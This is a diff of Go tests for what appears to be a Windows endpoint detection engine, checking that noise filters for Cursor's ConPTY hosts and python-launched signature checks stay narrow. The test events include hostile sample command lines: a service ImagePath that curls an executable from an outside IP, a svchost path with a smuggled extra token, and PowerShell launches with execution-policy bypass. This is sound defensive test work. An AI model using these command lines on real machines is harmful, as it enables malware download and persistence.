@@ -237,6 +237,10 @@ func TestServiceAndComRegistrationNoiseScoped(t *testing.T) {
 			Image:        `C:\Windows\System32\services.exe`,
 			TargetRegKey: `HKLM\System\CurrentControlSet\Services\WpnUserService_11dc25\ImagePath`,
 			Details:      `C:\WINDOWS\system32\svchost.exe -k UnistackSvcGroup`}},
+		{"webthreatdefusersvc per-user svchost ImagePath with trailing -p (2026-09-07 live, rec 2299110)", event.Event{EID: 13,
+			Image:        `C:\Windows\System32\services.exe`,
+			TargetRegKey: `HKLM\System\CurrentControlSet\Services\webthreatdefusersvc_fc140\ImagePath`,
+			Details:      `C:\WINDOWS\system32\svchost.exe -k LocalSystemNetworkRestricted -p`}},
 		{"MSI Afterburner RTCore64 driver ImagePath (kernel ??-prefix form, spaces)", event.Event{EID: 13,
 			Image:        `C:\Windows\System32\services.exe`,
 			TargetRegKey: `HKLM\System\CurrentControlSet\Services\RTCore64\ImagePath`,
@@ -271,6 +275,10 @@ func TestServiceAndComRegistrationNoiseScoped(t *testing.T) {
 			Image:        `C:\Windows\System32\services.exe`,
 			TargetRegKey: `HKLM\System\CurrentControlSet\Services\Evil\ImagePath`,
 			Details:      `C:\WINDOWS\system32\cmd.exe /c curl http://203.0.113.9/s.exe`}},
+		{"ImagePath svchost -k <group> -p followed by extra tokens (2026-09-08 widening guard)", "PERSIST-005", event.Event{EID: 13,
+			Image:        `C:\Windows\System32\services.exe`,
+			TargetRegKey: `HKLM\System\CurrentControlSet\Services\Evil6\ImagePath`,
+			Details:      `C:\WINDOWS\system32\svchost.exe -k LocalSystemNetworkRestricted -p -c evil`}},
 		{"ImagePath into user-writable dir", "PERSIST-005", event.Event{EID: 13,
 			Image:        `C:\Windows\System32\services.exe`,
 			TargetRegKey: `HKLM\System\CurrentControlSet\Services\Evil2\ImagePath`,
@@ -526,5 +534,92 @@ func TestColonFormFlagsStillFire(t *testing.T) {
 		CmdLine: `powershell.exe -ExecutionPolicy:Bypass -File C:\ProgramData\one.ps1`}
 	if !containsRule(hitRuleIDs(realEngine(t).Evaluate(&ev)), "PERSIST-001") {
 		t.Errorf("colon-form bypass from a user-writable path must fire PERSIST-001")
+	}
+}
+
+// TestCursorConPTYHostSuppressed pins EXEC-002's filter_cursor_pty (2026-09-08
+// tuning, same 451bce4 form as the EXEC-001 bridge filter): Cursor's ConPTY
+// pseudoconsole hosts — `conhost --headless [--inheritcursor] --width N
+// --height N --signal 0xN --server 0xN`, all 14 real hits 09-03→09-08 — are
+// quieted, while the incident shape, the same flags under any other parent,
+// any trailing payload token, and public pseudo-profile parents stay armed.
+func TestCursorConPTYHostSuppressed(t *testing.T) {
+	cursor := `C:\Users\jurij\AppData\Local\Programs\cursor\cursor.exe`
+	staging := `C:\Users\jurij\AppData\Local\Programs\cursor\_\cursor.exe`
+	// Both shapes observed live 2026-09-07/09-08 (sentinel.log rec 2352826,
+	// 2387718 / ALERTS.log hid R-20260907-6IR92-*).
+	pty := `\?\C:\WINDOWS\system32\conhost.exe --headless --width 127 --height 24 --signal 0xcf8 --server 0xcbc`
+	ptyInherit := `\?\C:\WINDOWS\system32\conhost.exe --headless --inheritcursor --width 273 --height 24 --signal 0x8ac --server 0xab8`
+	for _, parent := range []string{cursor, staging} {
+		for _, cmd := range []string{pty, ptyInherit} {
+			res := realEngine(t).Evaluate(&event.Event{EID: 1, RecordID: 70,
+				Image: `C:\Windows\system32\conhost.exe`, ParentImage: parent, CmdLine: cmd})
+			if containsRule(hitRuleIDs(res), "EXEC-002") {
+				t.Errorf("cursor-parented ConPTY host must be filtered; got hits %v", hitRuleIDs(res))
+			}
+		}
+	}
+	armed := []struct {
+		name string
+		ev   event.Event
+	}{
+		{"ConPTY flag shape under a foreign parent (mimic)", event.Event{EID: 1, RecordID: 71,
+			Image: `C:\Windows\system32\conhost.exe`, ParentImage: `C:\Windows\System32\cmd.exe`, CmdLine: pty}},
+		{"incident shape (headless conhost launching powershell) under the real cursor parent", event.Event{EID: 1, RecordID: 72,
+			Image: `C:\Windows\system32\conhost.exe`, ParentImage: cursor,
+			CmdLine: `"C:\WINDOWS\System32\conhost.exe" --headless powershell -ExecutionPolicy Bypass -c Write-Host evil`}},
+		{"ConPTY shape with a trailing payload token", event.Event{EID: 1, RecordID: 73,
+			Image: `C:\Windows\system32\conhost.exe`, ParentImage: cursor, CmdLine: pty + ` evil.exe`}},
+		{"ConPTY shape from a public pseudo-profile parent", event.Event{EID: 1, RecordID: 74,
+			Image:       `C:\Windows\system32\conhost.exe`,
+			ParentImage: `C:\Users\Public\AppData\Local\Programs\cursor\cursor.exe`, CmdLine: pty}},
+	}
+	for _, a := range armed {
+		if !containsRule(hitRuleIDs(realEngine(t).Evaluate(&a.ev)), "EXEC-002") {
+			t.Errorf("%s: EXEC-002 must stay armed", a.name)
+		}
+	}
+}
+
+// TestPythonSigverifyEncodedQuiet pins EXEC-001's filter_python_sigverify
+// (2026-09-08 tuning): the operator's python-parented
+// `powershell -NoProfile -EncodedCommand <Get-AuthenticodeSignature ...>`
+// signer-discovery launches (6 hits 09-03→09-08) are quiet, while the same
+// encoded bridge under any other parent, a different encoded payload from
+// the same python parent, and public pseudo-profile parents stay armed. The
+// 104-char base64 anchor is the tool-verified UTF-16LE encoding of exactly
+// 'Get-AuthenticodeSignature -LiteralPath ' (78 bytes = 26x3 — a base64
+// block boundary, so the prefix is fully determined by that fixed benign
+// plaintext regardless of what follows).
+func TestPythonSigverifyEncodedQuiet(t *testing.T) {
+	py := `C:\Users\jurij\AppData\Local\Programs\Python\python314\python.exe`
+	sigEnc := `RwBlAHQALQBBAHUAdABoAGUAbgB0AGkAYwBvAGQAZQBTAGkAZwBuAGEAdAB1AHIAZQAgAC0ATABpAHQAZQByAGEAbABQAGEAdABoACAAQAAoACcAQwA6AFwAVwBpAG4AZABvAHcAcwA=`
+	quiet := realEngine(t).Evaluate(&event.Event{EID: 1, RecordID: 80,
+		Image:       `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
+		ParentImage: py, CmdLine: `powershell -NoProfile -EncodedCommand ` + sigEnc})
+	if containsRule(hitRuleIDs(quiet), "EXEC-001") {
+		t.Errorf("python-parented sigverify encoded launch must be filtered; got %v", hitRuleIDs(quiet))
+	}
+	armed := []struct {
+		name string
+		ev   event.Event
+	}{
+		{"same encoded bridge under a cmd.exe parent (mimic)", event.Event{EID: 1, RecordID: 81,
+			Image:       `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
+			ParentImage: `C:\Windows\System32\cmd.exe`,
+			CmdLine:     `powershell -NoProfile -EncodedCommand ` + sigEnc}},
+		{"different encoded payload (Write-Output) from the same python parent", event.Event{EID: 1, RecordID: 82,
+			Image:       `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
+			ParentImage: py,
+			CmdLine:     `powershell -NoProfile -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGgAZQBsAGwAbwAnAA==`}},
+		{"sigverify shape from a public pseudo-profile python parent", event.Event{EID: 1, RecordID: 83,
+			Image:       `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
+			ParentImage: `C:\Users\Public\AppData\Local\Programs\Python\python314\python.exe`,
+			CmdLine:     `powershell -NoProfile -EncodedCommand ` + sigEnc}},
+	}
+	for _, a := range armed {
+		if !containsRule(hitRuleIDs(realEngine(t).Evaluate(&a.ev)), "EXEC-001") {
+			t.Errorf("%s: EXEC-001 must stay armed", a.name)
+		}
 	}
 }
